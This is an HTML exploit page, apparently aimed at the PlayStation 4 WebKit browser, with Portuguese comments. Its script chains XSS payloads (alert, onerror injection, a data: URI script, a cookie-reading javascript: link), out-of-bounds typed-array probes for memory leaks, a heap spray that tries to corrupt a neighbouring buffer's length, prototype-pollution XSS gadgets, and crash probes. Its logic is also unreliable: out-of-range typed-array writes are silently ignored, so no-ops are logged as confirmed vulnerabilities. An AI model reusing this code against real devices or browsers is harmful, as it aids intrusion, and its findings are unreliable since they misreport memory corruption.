<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 WebKit PoC - Enhanced Probes v2</title>
    <style>
        /* Estilos CSS (mantidos) */
        body { background: #111; color: #eee; font-family: monospace; padding: 15px; font-size: 12px; }
        #poc-output { background: #222; border: 1px solid #444; padding: 10px; height: 80vh; overflow-y: auto; white-space: pre-wrap; margin-top: 10px; }
        .log-info { color: #6cf; }
        .log-test { color: #fff; font-weight: bold; margin-top: 10px; display: block; border-top: 1px dashed #555; padding-top: 5px; }
        .log-subtest { color: #eee; font-weight: bold; margin-left: 10px; }
        .log-vuln { color: #ff4444; font-weight: bold; } /* Vermelho vivo */
        .log-leak { color: #FF9800; font-weight: bold; } /* Laranja para leaks potenciais */
        .log-good { color: #4CAF50; }
        .log-warn { color: #FFC107; }
        .log-error { color: #f44336; }
        .log-crash { color: #f0f; font-weight: bold; } /* Magenta para crashes potenciais */
        .xss-box { border: 2px dotted red; padding: 5px; margin: 5px; color: yellow; }
    </style>
</head>
<body>
    <h1>PS4 WebKit PoC - Enhanced Probes v2</h1>
    <p>Foco: Info Leak Detalhado, Corrupção Direta, PP Gadgets, Crash Probes.</p>
    <div id="controls">
        </div>
    <div id="poc-output"></div>
    <div id="xss-target-div" style="margin-top:10px; border: 1px dashed #555; padding: 10px;">Área para teste de XSS DOM.</div>

    <script>
        let outputDiv = document.getElementById('poc-output');
        const log = (message, type = 'info') => { /* Função log igual anterior */
             if (!outputDiv) return; try { const t=`[${new Date().toLocaleTimeString()}]`; const s=String(message).replace(/</g,"&lt;").replace(/>/g,"&gt;"); if(outputDiv.innerHTML.length>500000){outputDiv.innerHTML=outputDiv.innerHTML.substring(outputDiv.innerHTML.length-250000); outputDiv.innerHTML=`<span>[Log Truncado...]</span>\n`+outputDiv.innerHTML;} outputDiv.innerHTML+=`<span class="log-${type}">${t} ${s}\n</span>`; outputDiv.scrollTop = outputDiv.scrollHeight; } catch(e) { console.error("Erro log:",e); outputDiv=null;}
        };
        const PAUSE_DURATION = 300; // Pausa entre testes principais
        const SHORT_PAUSE = 50; // Pausa entre sub-testes

        // --- Teste 1: CSP Bypass com Payloads XSS (Mantido) ---
        const demonstrateXSS_Alert = () => { log("Payload XSS: Tentando alert()...", 'warn'); try { alert('XSS Executado via Alert!'); } catch (e) { log(`Alerta bloqueado: ${e.message}`, 'good'); } };
        const demonstrateXSS_DOM = () => { log("Payload XSS: Tentando manipulação DOM...", 'warn'); try { const target = document.getElementById('xss-target-div'); if (target) { target.innerHTML = '<h2 class="log-vuln">XSS DOM Executado!</h2><img src=x onerror=alert(\'XSS_DOM_ONERROR\')>'; log("Manipulação DOM realizada (verificar área de teste).", 'vuln'); } else { log("Div alvo para XSS DOM não encontrado.", 'error'); } } catch (e) { log(`Erro XSS DOM: ${e.message}`, 'error'); } };
        const demonstrateXSS_Cookie = () => { log("Payload XSS: Tentando ler cookie...", 'warn'); try { const c = document.cookie; log(`Cookie lido (pode estar vazio ou HttpOnly): '${c}'`, c ? 'vuln' : 'info'); } catch(e) { log(`Erro ao ler cookie: ${e.message}`, 'warn'); } };
        const runCSP_XSS = () => {
            log("--- Iniciando Teste 1: CSP Bypass + Payloads XSS ---", 'test');
            log("Tentando carregar payload XSS (alert) via data: URI...", 'subtest');
            try { const payloadJS = `log("[Payload Data:] Executando alert...", "warn"); try { alert('XSS via Data URI!'); } catch(e) { log("[Payload Data:] Alerta bloqueado.", "good"); }`; const encodedPayload = btoa(payloadJS); const s1 = document.createElement('script'); s1.src = 'data:text/javascript;base64,' + encodedPayload; s1.onerror = () => { log("ERRO: Falha ao carregar script data:!", 'error');}; document.body.appendChild(s1); log("Tag script data: (alert) adicionada.", 'info'); } catch (e) { log(`Erro data:: ${e.message}`, 'warn'); }
             log("Tentando disparar XSS DOM via inline handler (onerror)...", 'subtest');
            try { const i = document.createElement('img'); i.src = 'x'; i.setAttribute('onerror', "log('Handler onerror disparado!', 'info'); demonstrateXSS_DOM();"); document.body.appendChild(i); log("Tag img onerror (DOM XSS) adicionada.", 'info'); } catch (e) { log(`Erro onerror: ${e.message}`, 'warn'); }
             log("Injetando link javascript: URI (leitura de cookie)...", 'subtest');
             try { const a = document.createElement('a'); a.href = "javascript:log('Link JS URI Clicado!', 'warn'); demonstrateXSS_Cookie();"; a.textContent = "[Clique AQUI para Testar JS URI (Cookie XSS)]"; a.style.cssText='display:block;margin:5px;color:orange;border:1px solid orange;padding:3px;'; const placeholder = document.getElementById('js-link-placeholder'); if(placeholder) placeholder.replaceWith(a); else document.getElementById('controls').appendChild(a); log("Link JS URI adicionado (requer clique).", 'warn'); } catch (e) { log(`Erro ao criar link javascript:: ${e.message}`, 'warn'); }
            log("--- Teste 1 Concluído ---", 'test');
        };


        // --- Teste 2: Info Leak Agressivo v2 (Mais Offsets) ---
        const runLeakProbing_v2 = async () => {
            log("--- Iniciando Teste 2: Info Leak Agressivo v2 (Mais Offsets) ---", 'test');
            log("Tentando ler OOB perto de String, Float64Array após escrita OOB.", 'subtest');

            const leakCheck = async (objType, objFactory) => {
                 log(`Verificando leak perto de ${objType}...`, 'info');
                 try {
                     let targetObject = objFactory(); // Cria o objeto alvo
                     let buffer = new ArrayBuffer(64); // Buffer de ataque
                     let u8view = new Uint8Array(buffer);
                     let dataView = new DataView(buffer);
                     log(`Objeto ${objType} e Buffer alocados.`, 'info');

                     // Realizar escrita OOB (confirmada como VULN no teste anterior)
                     const writeOffset = -1;
                     try { u8view[writeOffset] = 0xAA; log("Escrita OOB @-1 realizada.", 'good'); }
                     catch(e) { log("Escrita OOB @-1 falhou inesperadamente.", 'error'); return; }
                     await new Promise(r=>setTimeout(r,SHORT_PAUSE)); // Pequena pausa

                     // Ler OOB em mais offsets relativos ao buffer
                     // Offsets em bytes relativos ao INÍCIO do buffer (buffer.byteLength + offset)
                     const readOffsetsBytes = [-32, -24, -16, -8, 8, 16, 24, 32];
                     const readLength = 16; // Ler 16 bytes (2x U64 ou F64) em cada offset
                     let foundPotentialLeak = false;
                     log(`Lendo OOB em vários offsets: ${readOffsetsBytes.join(', ')}...`, 'info');

                     for(const baseOffset of readOffsetsBytes) {
                         let leakInOffset = false;
                         for(let i = 0; i < readLength / 8; i++) { // Ler 2 valores de 64 bits
                             const currentByteOffset = baseOffset + (i * 8);
                             const absoluteReadAddr = buffer.byteLength + currentByteOffset; // Endereço de leitura relativo ao fim do buffer

                             if(absoluteReadAddr < 0 || absoluteReadAddr >= buffer.byteLength + 128) continue; // Evitar ler muito longe

                             try { // Ler como U64 (aproximado)
                                 const low = dataView.getUint32(absoluteReadAddr, true);
                                 const high = dataView.getUint32(absoluteReadAddr + 4, true);
                                 if (low !== 0 || high !== 0) {
                                     log(`  Leak U64? @Byte ${currentByteOffset}: H=0x${high.toString(16)} L=0x${low.toString(16)}`, 'leak');
                                     if (high > 0 || low > 0xFFFF) { log(`    >> VALOR SUSPEITO (U64)!`, 'vuln'); leakInOffset = true; foundPotentialLeak = true;}
                                 }
                             } catch(e) { /* Silenciar erros esperados de bounds */ }

                             try { // Ler como F64
                                 const valF64 = dataView.getFloat64(absoluteReadAddr, true);
                                 if (!isNaN(valF64) && valF64 !== 0) {
                                     log(`  Leak F64 @Byte ${currentByteOffset}: ${valF64}`, 'leak');
                                     log(`    >> VALOR SUSPEITO (F64)!`, 'vuln'); leakInOffset = true; foundPotentialLeak = true;
                                 }
                             } catch(e) { /* Silenciar erros */ }
                         }
                         if (leakInOffset) log(`  --> Leaks potenciais encontrados no offset base ${baseOffset}`, 'leak');
                         await new Promise(r=>setTimeout(r,SHORT_PAUSE)); // Pausa entre offsets
                     }
                     if (!foundPotentialLeak) { log(`Nenhum leak OOB suspeito encontrado perto de ${objType} nos offsets testados.`, 'info'); }
                     targetObject = null; buffer = null; // Ajudar GC?

                 } catch (e) { log(`Erro no teste de leak v2 perto de ${objType}: ${e.message}`, 'error'); }
                 await new Promise(r=>setTimeout(r,SHORT_PAUSE)); // Pausa entre tipos
            };

            // Testar perto de diferentes tipos
            await leakCheck("String", () => "A".repeat(1024));
            await leakCheck("Float64Array", () => new Float64Array(128));

            log("--- Teste 2 Concluído ---", 'test');
        };

        // --- Teste 3: Spray v2 (Tentativa de Corrupção Direta) ---
        const runSprayAndCorrupt_v2 = async () => {
            log("--- Iniciando Teste 3: Spray v2 (Tentativa Corrupção Direta) ---", 'test');
            log("AVISO: Suposições sobre layout de memória. Alta chance de falha/crash.", 'warn');
            try {
                const sprayCount = 50; // Menos objetos para talvez aumentar adjacência
                const bufferSize = 128;
                const allocations = [];
                log(`Alocando ${sprayCount} ArrayBuffers de ${bufferSize} bytes...`, 'info');
                for(let i=0; i<sprayCount; i++) {
                    // Alocar APENAS ArrayBuffers para aumentar chance de adjacência
                    allocations.push(new ArrayBuffer(bufferSize));
                }
                log("Alocação concluída.", 'info');

                // Escolher um ArrayBuffer no meio para atacar (atacante)
                // E o próximo como vítima
                const attackIndex = Math.floor(sprayCount / 2);
                const victimIndex = attackIndex + 1;

                if (victimIndex >= sprayCount) {
                    log("Não há buffer vítima suficiente.", 'warn'); return;
                }

                const attackerBuffer = allocations[attackIndex];
                const victimBuffer = allocations[victimIndex];
                const attackerView = new Uint8Array(attackerBuffer);
                const victimView = new Uint8Array(victimBuffer); // Usar Uint8Array para verificar bytes
                const victimDataView = new DataView(victimBuffer); // Para ler/escrever tamanho original

                log(`Atacante: Índice ${attackIndex}, Vítima: Índice ${victimIndex}.`, 'info');

                // Valor para escrever (distinto)
                const writeValue = 0xCC;
                // Offset OOB relativo ao atacante. Tenta atingir o INÍCIO da vítima.
                // Suposição: vítima começa logo após o atacante (bufferSize bytes depois)
                const writeOffset = bufferSize; // Escrever exatamente após o buffer atacante

                // Ler o tamanho original da vítima ANTES de corromper
                let originalVictimSize = -1;
                try { originalVictimSize = victimDataView.buffer.byteLength; } catch(e) {/* ignore */}
                 log(`Tamanho original da vítima: ${originalVictimSize}`, 'info');

                try {
                    log(`Tentando escrita OOB do Atacante[${attackIndex}] para Vítima[${victimIndex}] @offset ${writeOffset} com valor ${writeValue}...`, 'subtest');
                    attackerView[writeOffset] = writeValue;
                    log("Escrita OOB realizada. Verificando vítima...", 'vuln'); // Consideramos a escrita VULN por si só

                    // Verificar se o PRIMEIRO byte da vítima foi alterado
                    try {
                         const firstByte = victimView[0];
                         log(`Primeiro byte da Vítima[${victimIndex}] agora é: ${firstByte}`, firstByte === writeValue ? 'vuln' : 'info');
                         if (firstByte === writeValue) {
                             log("    >> CORRUPÇÃO DIRETA CONFIRMADA (Início da Vítima)! <<", 'vuln');
                         } else {
                              log("    Corrupção no início da vítima não confirmada.", 'warn');
                         }
                    } catch(e) { log(`Erro ao ler início da vítima: ${e.message}`, 'error'); }

                     // --- Tentativa mais avançada: Corromper o TAMANHO da vítima ---
                     // ISSO É ALTAMENTE ESPECÍFICO DA IMPLEMENTAÇÃO E PROVAVELMENTE FALHARÁ
                     // Suposição: O tamanho (64 bits) está 8 bytes ANTES do início dos dados da vítima
                     const sizeWriteOffset = bufferSize - 8; // Onde tentar escrever a partir do atacante
                     const newSizeLow = 0xFFFFFFFF; // Novo tamanho (parte baixa) - Enorme
                     const newSizeHigh = 0x7FFFFFFF; // Novo tamanho (parte alta) - Positivo máximo
                     try {
                        log(`Tentando corromper tamanho da Vítima via Atacante @offset ${sizeWriteOffset}...`, 'subtest');
                        // Usar DataView do atacante para escrever 64 bits OOB
                        const attackDataView = new DataView(attackerBuffer);
                        attackDataView.setUint32(sizeWriteOffset, newSizeLow, true); // Little-endian
                        attackDataView.setUint32(sizeWriteOffset + 4, newSizeHigh, true);
                        log("Escrita OOB para tamanho realizada.", 'vuln');

                        // Verificar se o tamanho da vítima mudou
                        let currentVictimSize = -1;
                         try { currentVictimSize = victimDataView.buffer.byteLength; } catch(e) {/* ignore */}
                        log(`Tamanho atual da Vítima: ${currentVictimSize}`, (currentVictimSize !== originalVictimSize && currentVictimSize > bufferSize) ? 'vuln' : 'info');
                        if (currentVictimSize !== originalVictimSize && currentVictimSize > bufferSize) {
                           log("    >> TAMANHO DA VÍTIMA APARENTEMENTE CORROMPIDO! <<", 'vuln');
                           // Tentar ler OOB na própria vítima (agora que tem tamanho 'maior')
                           try {
                               const oobReadIdx = bufferSize + 10; // Ler um pouco além do tamanho original
                               const oobVal = victimView[oobReadIdx];
                               log(`   Leitura OOB na Vítima[@${oobReadIdx}] após corrupção de tamanho: ${oobVal}`, 'leak');
                           } catch(e) { log(`   Leitura OOB na Vítima falhou: ${e.message}`, 'warn');}
                        } else {
                           log("    Corrupção de tamanho não confirmada.", 'warn');
                        }
                     } catch(e) { log(`Erro ao tentar corromper tamanho: ${e.message}`, 'error'); }

                } catch (writeError) { log(`✅ Escrita OOB inicial bloqueada/erro: ${writeError.message}`, 'good'); }

            } catch (e) { log(`Erro GERAL no teste Spray v2: ${e.message}`, 'error'); }
            log("--- Teste 3 Concluído ---", 'test');
        };


        // --- Teste 4: OOB Write (Mantido - Já confirmado) ---
        const runOOBTestU8_Confirm = async () => {
            log("--- Iniciando Teste 4: OOB Write (Uint8 Confirmação) ---", 'test');
            try {const bS=32; const b=new ArrayBuffer(bS); const v=new Uint8Array(b); const wV=0xEE; const wO=[-1,bS,bS+10]; for(const o of wO){ log(`Tentar OOB U8 @${o}...`,'subtest'); try{v[o]=wV;log(`VULN: OOB U8 @${o} OK!`,'vuln');}catch(e){log(`✅ OOB U8 @${o} Bloq: ${e.message}`,'good');} await new Promise(r=>setTimeout(r,SHORT_PAUSE));}}catch(e){log(`Erro teste 4: ${e.message}`,'error');} log("--- Teste 4 Concluído ---", 'test');
        };

        // --- Teste 5: Prototype Pollution v2 (Gadgets Simples) ---
        const runPPGadgets_v2 = () => {
             log("--- Iniciando Teste 5: PP v2 (Gadgets Simples) ---", 'test');
             const testKey = '__pp_gadget_test__';
             const testVal = '<img src=x onerror=alert("PP_Gadget_XSS")>'; // Payload XSS

             const gadgets = [
                 { name: 'innerHTML', target: () => document.createElement('div') },
                 { name: 'srcdoc', target: () => document.createElement('iframe') },
                 // Adicionar mais nomes de propriedades potencialmente vulneráveis se conhecidas
                 // Exemplo: 'constructor', 'toJSON', etc. dependendo de bibliotecas ou usos comuns
             ];

             let successCount = 0;
             for (const gadget of gadgets) {
                 log(`Testando PP no gadget: '${gadget.name}'...`, 'subtest');
                 try {
                     // Poluir
                     Object.prototype[gadget.name] = testVal;
                     log(`Propriedade '${gadget.name}' poluída.`, 'info');

                     // Criar um objeto alvo que poderia usar a propriedade
                     const element = gadget.target();

                     // Verificar se a propriedade foi herdada E se tem o valor poluído
                     if (element[gadget.name] === testVal) {
                         log(`VULN: PP OK! Objeto herdou '${gadget.name}' poluído.`, 'vuln');
                         successCount++;
                         // Tentar 'ativar' o gadget (isso pode ou não funcionar/ser seguro)
                         // Ex: adicionar o elemento ao DOM para ver se innerHTML/srcdoc executa XSS
                         // CUIDADO: Isso pode causar múltiplos alertas XSS
                         try {
                              log(`Tentando ativar gadget em elemento ${element.tagName}...`, 'warn');
                              const container = document.getElementById('xss-target-div') || document.body;
                              container.appendChild(element); // Adiciona ao DOM
                              // Uma pequena pausa para o navegador processar, se necessário
                              // await new Promise(r => setTimeout(r, SHORT_PAUSE));
                              // Remover logo em seguida para evitar poluir a página demais
                              // container.removeChild(element);
                              log(`Elemento ${element.tagName} com gadget adicionado/removido (verificar alertas).`, 'warn');
                         } catch(e) { log(`Erro ao ativar gadget ${gadget.name}: ${e.message}`, 'error');}

                     } else {
                         log(`Propriedade '${gadget.name}' não parece ter sido herdada/poluída no objeto alvo.`, 'info');
                     }

                     // Limpar
                     delete Object.prototype[gadget.name];
                     log(`Limpeza da propriedade '${gadget.name}'.`, 'info');

                 } catch(e) { log(`Erro durante teste do gadget '${gadget.name}': ${e.message}`, 'error'); }
                 // Limpeza final caso o delete falhe
                 try { delete Object.prototype[gadget.name]; } catch(e){}
             }

             if (successCount > 0) log(`PP confirmada para ${successCount} gadget(s).`, 'vuln');
             else log("Nenhum gadget PP testado pareceu funcionar diretamente.", 'warn');

             log("--- Teste 5 Concluído ---", 'test');
        };

        // --- NOVO Teste 6: Crash Probes ---
        const runCrashProbes = async () => {
            log("--- Iniciando Teste 6: Crash Probes (Pode Travar!) ---", 'test');
            log("AVISO: Estes testes tentarão causar travamentos.", 'warn');

            const crashTest = async (description, crashFn) => {
                log(`Tentando Crash Probe: ${description}...`, 'subtest');
                try {
                    await crashFn();
                    // Se chegou aqui, não travou
                    log("Probe não causou travamento imediato.", 'info');
                } catch(e) {
                    // Um erro JS não é um crash completo, mas pode indicar algo
                    log(`Probe gerou erro JS (não crash): ${e.message}`, 'warn');
                }
                 await new Promise(r=>setTimeout(r, SHORT_PAUSE)); // Pausa antes do próximo
            };

            // Probe 1: Escrever OOB com valor de ponteiro inválido (talvez?)
            await crashTest("OOB Write com 0x41414141", async () => {
                const b = new ArrayBuffer(16);
                const dv = new DataView(b);
                const writeOffset = 32; // OOB
                try {
                     log(`  Escrevendo 0x41414141 em OOB @${writeOffset}...`, 'crash');
                     dv.setUint32(writeOffset, 0x41414141, true); // Escreve 'AAAA'
                     dv.setUint32(writeOffset + 4, 0x41414141, true); // Escreve 'AAAA'
                     // Tentar alguma operação que possa usar o valor corrompido? (difícil sem saber o layout)
                } catch(e) { log(`  Erro esperado na escrita OOB: ${e.message}`, 'good'); throw e; /* Relança para indicar que não travou */}
            });

             // Probe 2: Ler OOB em endereço muito alto
             await crashTest("OOB Read em endereço alto", async () => {
                const b = new ArrayBuffer(16);
                const dv = new DataView(b);
                const readOffset = 0x7FFFFFFF; // Endereço positivo muito grande
                try {
                     log(`  Lendo U32 em OOB @${readOffset}...`, 'crash');
                     const val = dv.getUint32(readOffset, true);
                     log(`  Leitura retornou: ${val}`, 'info'); // Provavelmente falhará antes disso
                } catch(e) { log(`  Erro esperado na leitura OOB: ${e.message}`, 'good'); throw e; }
            });

            // Probe 3: Usar tamanho corrompido (se Teste 3 teve sucesso?)
            // Este é mais complexo e depende do sucesso anterior.
            // Poderia ser integrado ao Teste 3 ou chamado separadamente.
            // Por simplicidade, deixado fora por enquanto.

             log("--- Teste 6 Concluído (se não travou) ---", 'test');
        };


        // --- Função Principal ---
        const runAll = async () => {
             if (document.getElementById('runAllBtn')) document.getElementById('runAllBtn').disabled = true;

            log("Iniciando todos os testes (ENHANCED PROBES v2)...");
            const tests = [
                runCSP_XSS,              // Teste 1 - XSS Base (Mantido)
                runLeakProbing_v2,       // Teste 2 - Info Leak v2 (Mais Offsets)
                runSprayAndCorrupt_v2,   // Teste 3 - Spray v2 (Corrupção Direta)
                runOOBTestU8_Confirm,    // Teste 4 - OOB Confirm (Mantido)
                runPPGadgets_v2,         // Teste 5 - PP v2 (Gadgets)
                runCrashProbes           // Teste 6 - Crash Probes (NOVO)
            ];
             for(let i=0; i < tests.length; i++){
                 if (!outputDiv) { console.error("Output div NULO, parando testes."); break; }
                 try {
                     log(`--- EXECUTANDO TESTE ${i+1}/${tests.length} ---`, 'test');
                     const testFn = tests[i]; const result = testFn();
                     if (result instanceof Promise) { await result; }
                 } catch(testError) { log(`ERRO INESPERADO TESTE ${i+1}: ${testError.message} ${testError.stack}`, 'error'); }
                 if (i < tests.length - 1 && outputDiv) {
                    log(`Pausa ${PAUSE_DURATION}ms...`, 'info'); await new Promise(resolve => setTimeout(resolve, PAUSE_DURATION));
                 }
            }
            if(outputDiv) log("\n\nTodos os testes ENHANCED PROBES v2 concluídos. Revise o log.", 'test');
            else console.error("Script concluído, mas div log não disponível.");
             if (document.getElementById('runAllBtn')) document.getElementById('runAllBtn').disabled = false;
        };

        // Adicionar controles manuais atualizados
        document.getElementById('controls').innerHTML = `
            <button onclick="runCSP_XSS()">Rodar T1 (XSS)</button>
            <button onclick="runLeakProbing_v2()">Rodar T2 (Leak v2)</button>
            <button onclick="runSprayAndCorrupt_v2()">Rodar T3 (Spray v2)</button>
            <button onclick="runOOBTestU8_Confirm()">Rodar T4 (OOB Confirm)</button>
            <button onclick="runPPGadgets_v2()">Rodar T5 (PP Gadgets)</button>
            <button onclick="runCrashProbes()">Rodar T6 (Crash Probes)</button>
            <button id="runAllBtn" onclick="runAll()">Rodar Todos (Auto)</button>
            <br>
            <span style="margin-left: 5px;">Teste JS Link (T1): </span>
            <a id="js-link-placeholder" href="#" style="color:orange">[Link JS URI será injetado aqui]</a>
        `;

        // Opcional: Rodar tudo automaticamente ao carregar?
        // document.addEventListener('DOMContentLoaded', runAll);

    </script>

</body>
</html>
